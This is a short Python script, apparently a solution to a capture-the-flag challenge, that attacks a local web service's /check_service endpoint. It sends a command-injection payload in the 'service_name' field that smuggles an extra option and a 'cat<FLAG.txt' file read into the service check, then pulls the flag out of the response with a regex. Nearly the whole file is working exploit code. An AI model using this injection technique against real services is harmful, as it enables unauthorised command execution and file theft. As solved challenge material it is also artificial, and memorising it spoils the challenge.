import requests
import re

url = "http://127.0.0.1:32844/check_service"
payload = {"service_name": "-t custom cat<FLAG.txt"}
headers = {
    "Content-Type": "application/json",
    "Connection": "close"
}

session = requests.Session()
session.headers.update(headers)

try:
    resp = session.post(url, json=payload, timeout=10, allow_redirects=False)
    print("Status:", resp.status_code)
    print("Response:", resp.text)
    
    flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
    if flags:
        print("\nFLAG:", flags[0])
    else:
        print("\nNo flag found")
except Exception as e:
    print("Error:", type(e).__name__, str(e))
finally:
    session.close()

